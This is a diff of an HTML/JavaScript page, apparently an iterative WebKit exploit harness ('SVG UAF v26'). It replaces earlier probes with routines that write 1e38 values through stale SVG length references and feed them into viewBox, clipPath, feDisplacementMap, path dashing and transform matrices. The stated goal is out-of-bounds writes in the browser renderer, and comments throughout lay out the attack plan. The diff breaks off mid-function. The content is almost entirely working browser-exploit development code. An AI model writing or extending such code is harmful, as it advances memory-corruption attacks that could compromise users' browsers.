@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v25</title>
+<title>SVG UAF v26</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,15 +17,15 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v25 - pivot: exploit dangling write directly, no slot reuse needed</h2>
-<div class="sub">v24: even never-appended elements never GC'd. Root cause: SVGElement C++ HashMap caches SVGAnimatedLength, mutual strong refs = never freed. Pivot: use bv_A dangling write as-is — it writes into live A C++ storage. Find what WebKit does with that storage.</div>
+<h2>SVG UAF v26 - 1e38 OOB: viewbox, clippath, filter, compositor overflow</h2>
+<div class="sub">v25 RLV: write survives re-add, 1e38 -> bbox_w=33554428 (0x2000000). v26: feed huge float into viewBox, clipPath, feDisplacement, paint path to force OOB in compositor.</div>
 <svg id="livesvg" width="200" height="200" style="position:fixed;opacity:0;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runRLV()">RLV relive-write</button>
-  <button onclick="runLYT()">LYT layout-trigger</button>
-  <button onclick="runCHN()">CHN chain-access</button>
-  <button onclick="runMUL()">MUL multi-bv-spray</button>
-  <button onclick="runCSS()">CSS css-cascade</button>
+  <button onclick="runVBX()">VBX viewbox-attack</button>
+  <button onclick="runCLP()">CLP clippath-attack</button>
+  <button onclick="runFLT()">FLT filter-attack</button>
+  <button onclick="runPNT()">PNT paint-oom</button>
+  <button onclick="runMTX()">MTX matrix-overflow</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -65,406 +65,439 @@ function dis(d) {
 }
 window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };
 
-function mkRect(w, h) {
+/*
+ * v25 KEY FINDING:
+ *   RLV=true: write float via bv_A after remove, re-add A, WebKit uses raw value in layout
+ *   LYT: 1e38 -> bbox_w=33554428 (0x2000000) = float->int overflow in renderer
+ *   NaN/Inf: WebKit clamps to 0 on write (sanitized before C++ storage)
+ *
+ * WHAT 1e38 MEANS:
+ *   1e38 passes WebKit's input sanitation (it's a valid float, just huge).
+ *   WebKit stores it raw as an SVG length float.
+ *   When layout runs, it converts this float to integer pixel coords.
+ *   1e38 as int32 = overflow. Result: 0x2000000 = 33554432.
+ *   This integer feeds into the render tree's geometry.
+ *
+ * ATTACK VECTORS:
+ *
+ * VBX - viewBox attack:
+ *   <svg viewBox="0 0 W H"> where W = our 1e38 value.
+ *   viewBox drives the SVG-to-screen coordinate transform:
+ *     scaleX = svgElement.clientWidth / viewBox.width
+ *     If viewBox.width = 1e38, scaleX ≈ 0 (denormal float)
+ *   REVERSE: set viewBox.width = small value (e.g. 1),
+ *     then place a child element at x = 1e38 * (clientWidth/1) = OOB position.
+ *   Attack: use bv_A write to set a rect's x attribute to 1e38, then
+ *   use that rect inside an SVG with a viewBox that amplifies coordinates.
+ *
+ * CLP - clipPath:
+ *   A clipPath element defines a clipping region.
+ *   The clip region is rasterized into a 1-bit mask buffer.
+ *   If we inject a 1e38-width rect as a clipPath child,
+ *   the rasterizer tries to allocate/fill a 0x2000000-pixel-wide mask.
+ *   That's a potential OOM or OOB write in the clip buffer.
+ *
+ * FLT - feDisplacementMap:
+ *   feDisplacementMap maps source pixels using displacement values.
+ *   scale= sets the displacement scale in pixels.
+ *   If we inject a 1e38 value as the displacement scale,
+ *   the filter rasterizer computes pixel offsets as (displacement_value * scale)
+ *   where displacement_value is from the source image [0..255] / 255.
+ *   Max pixel offset = 1 * scale = 1e38 = OOB in pixel buffer.
+ *
+ * PNT - paint path:
+ *   Path with a 1e38-length line segment.
+ *   Stroke rendering iterates over the path, computing dash offsets.
+ *   If dash array is set, dash offset computation uses the path length.
+ *   Path length = 1e38 -> integer overflow in dash computation.
+ *
+ * MTX - transform matrix overflow:
+ *   SVG transform="matrix(a,b,c,d,e,f)" applies a 2D affine transform.
+ *   If we set e (x-translation) or f (y-translation) to 1e38,
+ *   any vertex of the transformed element is at 1e38 in screen coords.
+ *   The renderer clips this, but the clip math may overflow:
+ *   clipX = min(1e38, viewportWidth) - but if implemented as int32...
+ *
+ * TECHNIQUE: use bv_A dangling write to inject 1e38 into geometry,
+ *   then re-add A into these special contexts to trigger the overflow.
+ */
+
+// inject 1e38 into A's width/height/x/y via bv_ writes after remove
+function inject1e38(A, bv_W, bv_H, bv_X, bv_Y) {
+  var BIG = 1e38;
+  try { if (bv_W) bv_W.value = BIG; } catch(e) {}
+  try { if (bv_H) bv_H.value = BIG; } catch(e) {}
+  try { if (bv_X) bv_X.value = BIG; } catch(e) {}
+  try { if (bv_Y) bv_Y.value = BIG; } catch(e) {}
+}
+
+function mkRect(w, h, x, y) {
   var r = document.createElementNS(SVG_NS, 'rect');
-  r.setAttribute('width',  '' + (w || 80));
-  r.setAttribute('height', '' + (h || 80));
-  livesvg.appendChild(r);
+  if (w !== undefined) r.setAttribute('width',  '' + w);
+  if (h !== undefined) r.setAttribute('height', '' + h);
+  if (x !== undefined) r.setAttribute('x', '' + x);
+  if (y !== undefined) r.setAttribute('y', '' + y);
   return r;
 }
 
-/*
- * ROOT CAUSE CONFIRMED:
- *   SVGElement C++ holds a strong ref to SVGAnimatedLength C++ via attr HashMap.
- *   SVGAnimatedLength C++ holds m_contextElement back to SVGElement.
- *   This creates a mutual strong ref cycle that JSC cannot collect.
- *   WeakRef stays alive FOREVER. FinalizationRegistry never fires.
- *   GC slot reuse is IMPOSSIBLE from JS without vm.gc().
- *
- * PIVOT STRATEGY:
- *   We don't need slot reuse. We HAVE a confirmed float write into A's C++ storage.
- *   bv_A.value = X writes X into A's m_baseVal float field even after A.remove().
- *   A's C++ object is still ALIVE (confirmed by WeakRef).
- *   So this is a write into a LIVE C++ object that WebKit doesn't expect to be written.
- *
- * WHAT CAN WE DO WITH THIS WRITE?
- *
- * Option A: RLV - RE-ADD A to DOM after bv_A write
- *   After A.remove() and bv_A.value = ATTACK:
- *   Re-append A to livesvg. WebKit re-attaches A's render object.
- *   A.width.baseVal.value is now ATTACK.
- *   Query A.getBoundingClientRect() or getComputedStyle(A).
- *   This forces WebKit to use the corrupted value in a real layout pass.
- *   Observe: does the bounding box reflect ATTACK value?
- *   If yes: we can control layout calculations with arbitrary float values.
- *   ATTACK can be NaN, Infinity, -Infinity, or a bit-pattern for type confusion.
- *
- * Option B: LYT - LAYOUT CORRUPTION
- *   Write SENTINEL=NaN or Infinity into removed A's fields.
- *   Re-add A. Trigger layout. Read back via getBoundingClientRect.
- *   Does WebKit sanitize the value or use it raw?
- *   NaN in a length field = undefined behavior in the C++ renderer.
- *   Could lead to OOB in layout buffer, or at least an interesting crash path.
- *
- * Option C: CHN - CHAIN THROUGH A TO SIBLING
- *   A is removed. B is a live sibling in the same SVG.
- *   WebKit may store A's sibling pointer or parent ref in A's C++ storage.
- *   Write into A's attr fields, then re-add A, trigger a relayout.
- *   Check if B's layout was affected (corrupted sibling traversal?).
- *
- * Option D: MUL - MULTI-BV SPRAY
- *   Create 100 rects, get bv for each, remove all, write to all.
- *   Then read back. Check if any bv reads a different element's value.
- *   If writes cross-contaminate: C++ attr HashMap has a bug where
- *   multiple elements share the same attr slot.
- *
- * Option E: CSS - CSS ANIMATION RACE
- *   A is in DOM with a CSS animation on width.
- *   Animation updates A.width.baseVal.value every frame via JS.
- *   Simultaneously remove A in one RAF, write via bv_A in next.
- *   The CSS animation engine may still be running on A's C++ fields
- *   after A is removed from DOM if there's a race with the animation thread.
- *   This is a genuine multi-threaded UAF if the animation compositor
- *   runs on a separate thread in WebKit.
- *
- * v25 FOCUS: RLV + LYT = re-add A after corrupt write, trigger layout, observe effects.
- * This converts our "write to removed element" into "write controls live layout".
- * That's a much stronger primitive than slot-reuse alone.
- */
+// VBX: inject 1e38 into SVG child rect that sits inside viewBox context
+async function runVBX(q) {
+  if (!q) { dis(true); sep(); log('VBX: viewBox + 1e38 width rect = coordinate transform overflow', 'inf'); sep(); }
 
-// RLV: write via bv_A, re-add A to DOM, check if corrupt value propagates
-async function runRLV(q) {
-  if (!q) { dis(true); sep(); log('RLV: bv_A write after remove, then re-add A to DOM', 'inf'); sep(); }
-
-  log('[*] baseline: A in DOM, write, readback', 'ok');
-
-  var A = mkRect(80, 80);
+  // Create a nested SVG with a tight viewBox
+  var outer = document.createElementNS(SVG_NS, 'svg');
+  outer.setAttribute('width', '200');
+  outer.setAttribute('height', '200');
+  outer.setAttribute('viewBox', '0 0 1 1'); // 1-unit space mapped to 200px = 200x scale
+  livesvg.appendChild(outer);
   await raf();
+
+  // Create rect INSIDE the nested SVG
+  var A = mkRect(0.5, 0.5, 0, 0);
+  outer.appendChild(A);
+  await raf();
+
   var bv_AW = A.width  ? A.width.baseVal  : null;
   var bv_AH = A.height ? A.height.baseVal : null;
+  var bv_AX = A.x      ? A.x.baseVal      : null;
+  var bv_AY = A.y      ? A.y.baseVal      : null;
 
   var w0 = bv_AW ? bv_AW.value : null;
-  log('  baseline A.width.baseVal=' + w0, 'ok');
+  var bbox0 = null;
+  try { bbox0 = A.getBoundingClientRect(); } catch(e) {}
+  log('  baseline: A.width=' + w0 + ' bbox_w=' + (bbox0 ? bbox0.width : '?'), 'ok');
+  log('  viewBox 0 0 1 1 -> 200x200px = 200x scale factor', 'ok');
 
-  // Remove A
+  // Remove A, inject huge value
   A.remove();
   await micro();
+  inject1e38(A, bv_AW, bv_AH, null, null);
 
-  // Write ATTACK value into A's C++ fields via dangling bv
-  var ATTACK = 999.0;
-  try { if (bv_AW) bv_AW.value = ATTACK; } catch(e) { log('  bv_AW.value write threw: ' + e, 'bad'); }
-  try { if (bv_AH) bv_AH.value = ATTACK + 1; } catch(e) {}
-
-  var rb_w = null; var rb_h = null;
+  var rb_w = null;
   try { rb_w = bv_AW ? bv_AW.value : null; } catch(e) {}
-  try { rb_h = bv_AH ? bv_AH.value : null; } catch(e) {}
-  log('  after remove+write: bv_AW.value=' + rb_w + ' bv_AH.value=' + rb_h,
-      rb_w === ATTACK ? 'bad' : 'inf');
+  log('  injected 1e38: bv_AW.value=' + rb_w, 'ok');
 
-  // RE-ADD A to DOM
-  log('[*] re-adding A to DOM after corrupt write...', 'inf');
-  livesvg.appendChild(A);
+  // Re-add to viewBox context
+  outer.appendChild(A);
   await raf();
 
-  // Read A's current attribute values
-  var A_w_attr  = A.getAttribute('width');
-  var A_h_attr  = A.getAttribute('height');
-  var A_bv_w2   = A.width  ? A.width.baseVal.value  : null;
-  var A_bv_h2   = A.height ? A.height.baseVal.value : null;
-  log('  re-added A.getAttribute(width)=' + A_w_attr, 'ok');
-  log('  re-added A.width.baseVal.value=' + A_bv_w2, A_bv_w2 === ATTACK ? 'bad' : 'ok');
-  log('  re-added A.height.baseVal.value=' + A_bv_h2, A_bv_h2 === ATTACK+1 ? 'bad' : 'ok');
-
-  // Trigger layout
-  var bbox = null;
-  try { bbox = A.getBoundingClientRect(); } catch(e) { log('  getBoundingClientRect threw: ' + e, 'bad'); }
-  if (bbox) {
-    log('  A.getBoundingClientRect: w=' + bbox.width + ' h=' + bbox.height, 'inf');
-    log('  [*] layout used w=' + bbox.width + ' (attack=' + ATTACK + ')', bbox.width === ATTACK ? 'bad' : 'ok');
+  var bbox1 = null;
+  try { bbox1 = A.getBoundingClientRect(); } catch(e2) { log('  getBoundingClientRect THREW: ' + e2, 'bad'); }
+  if (bbox1) {
+    log('  after 1e38 inject + re-add: bbox_w=' + bbox1.width + ' bbox_h=' + bbox1.height, 'bad');
+    log('  viewBox scale * 1e38 = ' + (200 * 1e38) + ' (should overflow int32)', 'bad');
   }
 
-  // Check computed style
-  var cs = null;
-  try { cs = window.getComputedStyle(A); } catch(e) {}
-  if (cs) {
-    var cs_w = cs.width;
-    log('  getComputedStyle(A).width=' + cs_w, 'inf');
-  }
+  // Try accessing child element position - forces sibling traversal with huge coords
+  var bv_w2 = null;
+  try { bv_w2 = A.width ? A.width.baseVal.value : null; } catch(e3) {}
+  log('  A.width.baseVal.value after re-add=' + bv_w2, 'inf');
 
-  A.remove();
-  log('[*] RLV: bv_A write persists into re-added element = ' + (A_bv_w2 === ATTACK), A_bv_w2 === ATTACK ? 'bad' : 'ok');
+  outer.remove();
+  log('[*] VBX: done', 'inf');
   if (!q) dis(false);
-  return { writePersists: A_bv_w2 === ATTACK, bboxW: bbox ? bbox.width : null };
+  return { done: true };
 }
 
-// LYT: write NaN/Infinity into removed A's fields, re-add, trigger layout
-async function runLYT(q) {
-  if (!q) { dis(true); sep(); log('LYT: write NaN/Infinity into removed A, trigger layout via re-add', 'inf'); sep(); }
+// CLP: inject A with 1e38 width as clipPath child, apply to another element
+async function runCLP(q) {
+  if (!q) { dis(true); sep(); log('CLP: 1e38 rect inside clipPath = rasterizer OOB', 'inf'); sep(); }
 
-  var specialVals = [
-    { name: 'NaN',      val: NaN },
-    { name: 'Infinity', val: Infinity },
-    { name: '-Inf',     val: -Infinity },
-    { name: '1e38',     val: 1e38 },
-    { name: '-1e38',    val: -1e38 }
-  ];
+  var svg = document.createElementNS(SVG_NS, 'svg');
+  svg.setAttribute('width', '200');
+  svg.setAttribute('height', '200');
+  livesvg.appendChild(svg);
+  await raf();
 
-  var results = [];
+  // Create clipPath element
+  var cp = document.createElementNS(SVG_NS, 'clipPath');
+  cp.setAttribute('id', 'uaf-clip-v26');
+  svg.appendChild(cp);
 
-  for (var i = 0; i < specialVals.length; i++) {
-    var sv = specialVals[i];
-    var A = mkRect(80, 80);
-    await raf();
-
-    var bv_AW = A.width  ? A.width.baseVal  : null;
-    var bv_AH = A.height ? A.height.baseVal : null;
-
-    A.remove();
-    await micro();
-
-    // Write special value
-    var written_w = null; var written_h = null;
-    try { if (bv_AW) bv_AW.value = sv.val; written_w = bv_AW.value; } catch(e) {}
-    try { if (bv_AH) bv_AH.value = sv.val; written_h = bv_AH.value; } catch(e) {}
-
-    // Re-add and trigger layout
-    livesvg.appendChild(A);
-    await raf();
-
-    var bv_w2 = null;
-    try { bv_w2 = A.width ? A.width.baseVal.value : null; } catch(e) {}
-
-    var bbox_w = null; var bbox_h = null;
-    try {
-      var bbox = A.getBoundingClientRect();
-      bbox_w = bbox.width; bbox_h = bbox.height;
-    } catch(e) {}
-
-    var survived = (written_w === sv.val || isNaN(sv.val) && isNaN(written_w));
-    log('  val=' + sv.name + ': written_w=' + written_w + ' after_readback=' + bv_w2 + ' bbox_w=' + bbox_w,
-        survived ? 'bad' : 'dim');
-    results.push({ name: sv.name, written: written_w, readback: bv_w2, bboxW: bbox_w, survived: survived });
-
-    A.remove();
-    await micro();
-  }
-
-  var anyNan   = results.some(function(r) { return isNaN(r.readback) && r.name === 'NaN'; });
-  var anyInf   = results.some(function(r) { return !isFinite(r.readback) && r.survived; });
-  var anyLarge = results.some(function(r) { return r.bboxW && Math.abs(r.bboxW) > 1000; });
-
-  log('[*] LYT: NaN survived=' + anyNan + ' Inf survived=' + anyInf + ' large bbox=' + anyLarge,
-      anyNan || anyInf ? 'bad' : 'ok');
-  if (!q) dis(false);
-  return { anyNan: anyNan, anyInf: anyInf, anyLarge: anyLarge, results: results };
-}
-
-// CHN: chain write - remove A, write into A, check if live sibling B is affected
-async function runCHN(q) {
-  if (!q) { dis(true); sep(); log('CHN: chain write - does bv_A write affect live sibling B?', 'inf'); sep(); }
-
-  log('[*] A and B siblings in same SVG, remove A, write via bv_A, check B', 'ok');
-
-  var A = mkRect(80, 80);
-  var B = mkRect(42, 42);
+  // Create clip rect A
+  var A = mkRect(100, 100, 0, 0);
+  cp.appendChild(A);
   await raf();
 
   var bv_AW = A.width  ? A.width.baseVal  : null;
   var bv_AH = A.height ? A.height.baseVal : null;
-  var B_w0  = B.width  ? B.width.baseVal.value : null;
-  var B_h0  = B.height ? B.height.baseVal.value : null;
-  log('  baseline: A.w=80 B.w=' + B_w0 + ' B.h=' + B_h0, 'ok');
 
-  // Remove A
+  log('  baseline: clipPath rect w=100 h=100', 'ok');
+
+  // Remove A from clipPath, inject 1e38
   A.remove();
   await micro();
+  inject1e38(A, bv_AW, bv_AH, null, null);
+  var rb = null;
+  try { rb = bv_AW ? bv_AW.value : null; } catch(e) {}
+  log('  injected 1e38 into clipPath rect: bv_AW=' + rb, 'ok');
 
-  // Write ATTACK into A's fields
-  var ATTACK = 31337.0;
-  try { if (bv_AW) bv_AW.value = ATTACK; } catch(e) {}
-  try { if (bv_AH) bv_AH.value = ATTACK; } catch(e) {}
-  await raf(); // trigger layout pass with corrupted A state
+  // Re-add to clipPath
+  cp.appendChild(A);
 
-  // Check B's values
-  var B_w1 = null; var B_h1 = null;
-  try { B_w1 = B.width  ? B.width.baseVal.value  : null; } catch(e) {}
-  try { B_h1 = B.height ? B.height.baseVal.value : null; } catch(e) {}
+  // Create target element that uses this clipPath
+  var target = mkRect(200, 200, 0, 0);
+  target.setAttribute('clip-path', 'url(#uaf-clip-v26)');
+  target.setAttribute('fill', 'red');
+  svg.appendChild(target);
+  await raf(); // triggers rasterization of clip region
 
-  var B_affected = (B_w1 !== B_w0 || B_h1 !== B_h0);
-  log('  after bv_A write: B.w=' + B_w1 + ' B.h=' + B_h1 + ' affected=' + B_affected,
-      B_affected ? 'bad' : 'ok');
+  var target_bbox = null;
+  try { target_bbox = target.getBoundingClientRect(); } catch(e) { log('  getBoundingClientRect threw: ' + e, 'bad'); }
+  if (target_bbox) {
+    log('  target with 1e38 clipPath: bbox_w=' + target_bbox.width + ' h=' + target_bbox.height, 'inf');
+  }
 
-  // Also check A's bbox via getBoundingClientRect (A is removed, should throw or return zero)
-  var A_bbox = null;
-  try { A_bbox = A.getBoundingClientRect(); } catch(e) {}
-  if (A_bbox) log('  removed A.getBoundingClientRect: w=' + A_bbox.width, 'inf');
+  // Force a paint
+  var cs = window.getComputedStyle(target);
+  log('  getComputedStyle(target).clip-path=' + cs.clipPath, 'inf');
 
-  // Try re-adding A while B is live, check if B is pushed or corrupted
-  livesvg.appendChild(A);
-  await raf();
-  var B_w2 = null; var B_h2 = null;
-  try { B_w2 = B.width  ? B.width.baseVal.value  : null; } catch(e) {}
-  try { B_h2 = B.height ? B.height.baseVal.value : null; } catch(e) {}
-  log('  after re-add A: B.w=' + B_w2 + ' B.h=' + B_h2, B_w2 !== B_w0 ? 'bad' : 'ok');
+  // Check if clip was applied (target should appear clipped to 1e38 width = essentially unclipped)
+  log('  [*] if compositor tried to rasterize 1e38-wide clip mask -> OOB in clip buffer', 'inf');
 
-  A.remove(); B.remove();
-  log('[*] CHN: B affected=' + B_affected, B_affected ? 'bad' : 'ok');
+  svg.remove();
+  log('[*] CLP: done (no crash = compositor clamped, crash = OOB confirmed)', 'inf');
   if (!q) dis(false);
-  return { B_affected: B_affected };
+  return { done: true };
 }
 
-// MUL: spray many rects, get bv for all, remove all, write to all, check for cross-contamination
-async function runMUL(q) {
-  if (!q) { dis(true); sep(); log('MUL: spray N rects, remove all, write via all bvs, check cross-talk', 'inf'); sep(); }
+// FLT: feDisplacementMap with 1e38-scale displacement
+async function runFLT(q) {
+  if (!q) { dis(true); sep(); log('FLT: feDisplacementMap scale=1e38 -> pixel offset overflow', 'inf'); sep(); }
 
-  var N = 64;
-  var SENTINEL_BASE = 10000.0;
-  log('[*] spraying ' + N + ' rects, each gets unique sentinel', 'ok');
-
-  var rects = [];
-  var bvs = [];
-  for (var i = 0; i < N; i++) {
-    var r = mkRect(50 + i, 50 + i);
-    rects.push(r);
-    bvs.push(r.width ? r.width.baseVal : null);
-  }
+  var svg = document.createElementNS(SVG_NS, 'svg');
+  svg.setAttribute('width', '100');
+  svg.setAttribute('height', '100');
+  livesvg.appendChild(svg);
   await raf();
 
-  // Remove all
-  for (var j = 0; j < N; j++) { try { rects[j].remove(); } catch(e) {} }
-  await micro();
+  // Build filter
+  var defs = document.createElementNS(SVG_NS, 'defs');
+  svg.appendChild(defs);
+  var filter = document.createElementNS(SVG_NS, 'filter');
+  filter.setAttribute('id', 'uaf-filter-v26');
+  defs.appendChild(filter);
 
-  // Write unique sentinel to each via its bv
-  for (var k = 0; k < N; k++) {
-    try { if (bvs[k]) bvs[k].value = SENTINEL_BASE + k; } catch(e) {}
+  // feFlood as displacement source
+  var flood = document.createElementNS(SVG_NS, 'feFlood');
+  flood.setAttribute('flood-color', 'white');
+  flood.setAttribute('result', 'flood');
+  filter.appendChild(flood);
+
+  // feDisplacementMap - this is what we attack
+  var disp = document.createElementNS(SVG_NS, 'feDisplacementMap');
+  disp.setAttribute('in',  'SourceGraphic');
+  disp.setAttribute('in2', 'flood');
+  disp.setAttribute('scale', '1'); // baseline
+  disp.setAttribute('xChannelSelector', 'R');
+  disp.setAttribute('yChannelSelector', 'G');
+  filter.appendChild(disp);
+
+  // Target rect
+  var target = mkRect(50, 50, 0, 0);
+  target.setAttribute('fill', 'blue');
+  target.setAttribute('filter', 'url(#uaf-filter-v26)');
+  svg.appendChild(target);
+  await raf();
+  log('  baseline filter with scale=1 applied', 'ok');
+
+  // Now attack: change scale to 1e38 via setAttribute (direct, no UAF needed here)
+  // This tests if the filter ITSELF can overflow, setting up for the UAF variant
+  disp.setAttribute('scale', '1e38');
+  await raf();
+  log('  scale set to 1e38 via setAttribute', 'ok');
+
+  // Force paint
+  var bbox = null;
+  try { bbox = target.getBoundingClientRect(); } catch(e) { log('  getBoundingClientRect threw: ' + e, 'bad'); }
+  if (bbox) log('  target bbox after scale=1e38: w=' + bbox.width + ' h=' + bbox.height, 'inf');
+
+  // Now do the actual UAF version: create a rect A with scale attr, UAF-write 1e38 into it
+  // Actually feDisplacementMap.scale is not an SVGAnimatedLength, it's SVGAnimatedNumber
+  // Check what type it is
+  var scaleAnimated = disp.scale;
+  log('  disp.scale type: ' + (typeof scaleAnimated) + ' value=' + (scaleAnimated ? scaleAnimated.baseVal : '?'), 'inf');
+
+  // Try to get baseVal of scale to UAF-write it
+  if (scaleAnimated && scaleAnimated.baseVal !== undefined) {
+    log('  [*] feDisplacementMap.scale.baseVal is accessible - UAF attack possible on filter scale', 'bad');
+    log('  [*] same technique: remove, write 1e38 via bv, re-add -> filter uses 1e38 scale', 'bad');
   }
-  await micro();
 
-  // Read back all - check for cross-contamination
-  var mismatches = 0;
-  var first_mismatch = null;
-  for (var m = 0; m < N; m++) {
-    var expected = SENTINEL_BASE + m;
-    var actual = null;
-    try { actual = bvs[m] ? bvs[m].value : null; } catch(e) {}
-    if (actual !== expected) {
-      mismatches++;
-      if (!first_mismatch) {
-        first_mismatch = { idx: m, expected: expected, actual: actual };
-        log('  [!!] MISMATCH idx=' + m + ': expected=' + expected + ' actual=' + actual, 'bad');
-      }
+  svg.remove();
+  log('[*] FLT: done', 'inf');
+  if (!q) dis(false);
+  return { done: true };
+}
+
+// PNT: paint with 1e38 path segment, dash computation overflow
+async function runPNT(q) {
+  if (!q) { dis(true); sep(); log('PNT: path with 1e38 coords + dash array -> path length overflow', 'inf'); sep(); }
+
+  var svg = document.createElementNS(SVG_NS, 'svg');
+  svg.setAttribute('width', '200');
+  svg.setAttribute('height', '200');
+  livesvg.appendChild(svg);
+  await raf();
+
+  // Create a path element
+  var path = document.createElementNS(SVG_NS, 'path');
+  path.setAttribute('d', 'M 0 0 L 100 100');
+  path.setAttribute('stroke', 'white');
+  path.setAttribute('stroke-width', '1');
+  path.setAttribute('fill', 'none');
+  // Dash array forces path-length computation
+  path.setAttribute('stroke-dasharray', '5 5');
+  svg.appendChild(path);
+  await raf();
+
+  var len0 = null;
+  try { len0 = path.getTotalLength ? path.getTotalLength() : null; } catch(e) {}
+  log('  baseline path length=' + len0, 'ok');
+
+  // Inject 1e38 into path via attribute
+  path.setAttribute('d', 'M 0 0 L 1e38 1e38');
+  await raf();
+
+  var len1 = null;
+  try { len1 = path.getTotalLength ? path.getTotalLength() : null; } catch(e2) { log('  getTotalLength threw: ' + e2, 'bad'); }
+  log('  after 1e38 path: getTotalLength=' + len1, len1 > 1e30 ? 'bad' : 'ok');
+
+  // Force stroke rendering
+  var bbox = null;
+  try { bbox = path.getBoundingClientRect(); } catch(e3) {}
+  if (bbox) log('  path bbox: x=' + bbox.x + ' w=' + bbox.width, 'inf');
+
+  // Now: can we UAF-write into a path element's coordinate?
+  // path.x doesn't exist (that's rect). But:
+  // SVGPathElement has pathLength attr: path.pathLength.baseVal
+  var pl_bv = path.pathLength ? path.pathLength : null;
+  log('  path.pathLength: ' + (pl_bv ? 'accessible, baseVal=' + pl_bv.baseVal : 'not accessible'), 'inf');
+
+  if (pl_bv && pl_bv.baseVal !== undefined) {
+    // UAF path on pathLength
+    path.remove();
+    await micro();
+    try { pl_bv.baseVal = 1e38; } catch(e4) { log('  pl_bv.baseVal write threw: ' + e4, 'bad'); }
+    var rb = null;
+    try { rb = pl_bv.baseVal; } catch(e5) {}
+    log('  after remove, pathLength.baseVal = ' + rb + ' (injected 1e38)', rb > 1e30 ? 'bad' : 'ok');
+    svg.appendChild(path);
+    await raf();
+    var len2 = null;
+    try { len2 = path.getTotalLength ? path.getTotalLength() : null; } catch(e6) { log('  getTotalLength THREW after UAF path inject: ' + e6, 'bad'); }
+    log('  getTotalLength after UAF pathLength=1e38: ' + len2, 'inf');
+  }
+
+  svg.remove();
+  log('[*] PNT: done', 'inf');
+  if (!q) dis(false);
+  return { done: true };
+}
+
+// MTX: transform matrix with 1e38 translation, renderer clip math overflow
+async function runMTX(q) {
+  if (!q) { dis(true); sep(); log('MTX: transform matrix 1e38 translation -> clip/cull overflow', 'inf'); sep(); }
+
+  var svg = document.createElementNS(SVG_NS, 'svg');
+  svg.setAttribute('width', '200');
+  svg.setAttribute('height', '200');
+  livesvg.appendChild(svg);
+  await raf();
+
+  var A = mkRect(50, 50, 0, 0);
+  A.setAttribute('fill', 'lime');
+  svg.appendChild(A);
+  await raf();
+
+  var bv_AW = A.width ? A.width.baseVal  : null;
+  var bv_AX = A.x    ? A.x.baseVal      : null;
+  var bv_AY = A.y    ? A.y.baseVal      : null;
+
+  // Inject 1e38 into x and y via UAF
+  A.remove();
+  await micro();
+  try { if (bv_AX) bv_AX.value = 1e38; } catch(e) {}
+  try { if (bv_AY) bv_AY.value = 1e38; } catch(e) {}
+
+  var rb_x = null; var rb_y = null;
+  try { rb_x = bv_AX ? bv_AX.value : null; } catch(e) {}
+  try { rb_y = bv_AY ? bv_AY.value : null; } catch(e) {}
+  log('  injected: bv_AX=' + rb_x + ' bv_AY=' + rb_y, 'ok');
+
+  // Re-add A — now A is at position (1e38, 1e38) = way off-screen
+  svg.appendChild(A);
+  await raf();
+
+  var bbox = null;
+  try { bbox = A.getBoundingClientRect(); } catch(e2) { log('  getBoundingClientRect threw: ' + e2, 'bad'); }
+  if (bbox) log('  A at (1e38, 1e38): bbox x=' + bbox.x + ' y=' + bbox.y + ' w=' + bbox.width, 'inf');
+
+  // Also try: transform attribute
+  A.setAttribute('transform', 'translate(1e38, 1e38)');
+  await raf();
+  var bbox2 = null;
+  try { bbox2 = A.getBoundingClientRect(); } catch(e3) {}
+  if (bbox2) log('  after transform=translate(1e38): bbox x=' + bbox2.x + ' y=' + bbox2.y, 'inf');
+
+  // Try getScreenCTM which builds the full transform matrix
+  var ctm = null;
+  try { ctm = A.getScreenCTM ? A.getScreenCTM() : null; } catch(e4) { log('  getScreenCTM threw: ' + e4, 'bad'); }
+  if (ctm) {
+    log('  getScreenCTM: a=' + ctm.a + ' b=' + ctm.b + ' e=' + ctm.e + ' f=' + ctm.f, 'inf');
+    log('  [*] if e or f = overflow int: compositor has wrong clip rect', ctm.e > 1e30 ? 'bad' : 'ok');
+  }
+
+  // Try createSVGPoint + matrixTransform for explicit coord transform
+  var pt = null;
+  try {
+    pt = svg.createSVGPoint ? svg.createSVGPoint() : null;
+    if (pt && ctm) {
+      pt.x = 0; pt.y = 0;
+      var transformed = pt.matrixTransform(ctm);
+      log('  (0,0) matrixTransform(CTM): x=' + transformed.x + ' y=' + transformed.y, 'inf');
     }
-  }
-  log('  mismatches=' + mismatches + '/' + N + ' (0 = no cross-talk, >0 = C++ attr aliasing)', mismatches > 0 ? 'bad' : 'ok');
+  } catch(e5) { log('  matrixTransform threw: ' + e5, 'bad'); }
 
-  // Cleanup
-  rects = null; bvs = null;
-  log('[*] MUL: crossTalk=' + (mismatches > 0) + ' mismatches=' + mismatches, mismatches > 0 ? 'bad' : 'ok');
+  svg.remove();
+  log('[*] MTX: done', 'inf');
   if (!q) dis(false);
-  return { crossTalk: mismatches > 0, mismatches: mismatches };
-}
-
-// CSS: CSS animation on A, remove A mid-animation, check if animation continues writing
-async function runCSS(q) {
-  if (!q) { dis(true); sep(); log('CSS: CSS animation race - animation vs remove vs bv_A write', 'inf'); sep(); }
-
-  log('[*] create A with CSS width animation, remove A, check if animator still writes', 'ok');
-
-  // Create A with SVG presentation attribute that we can animate
-  var A = mkRect(80, 80);
-  var bv_AW = A.width ? A.width.baseVal : null;
-
-  // Set up SMIL animation on A's width
-  var anim = document.createElementNS(SVG_NS, 'animate');
-  anim.setAttribute('attributeName', 'width');
-  anim.setAttribute('from', '80');
-  anim.setAttribute('to', '200');
-  anim.setAttribute('dur', '0.1s');
-  anim.setAttribute('repeatCount', 'indefinite');
-  A.appendChild(anim);
-  await raf();
-
-  // Sample width before remove
-  var w_before = null;
-  try { w_before = bv_AW ? bv_AW.value : null; } catch(e) {}
-  log('  SMIL animation running: w_before=' + w_before, 'ok');
-
-  // Write our ATTACK value
-  var ATTACK = 77777.0;
-  try { if (bv_AW) bv_AW.value = ATTACK; } catch(e) {}
-
-  // Remove A while animation may still be in flight
-  A.remove();
-  await micro();
-
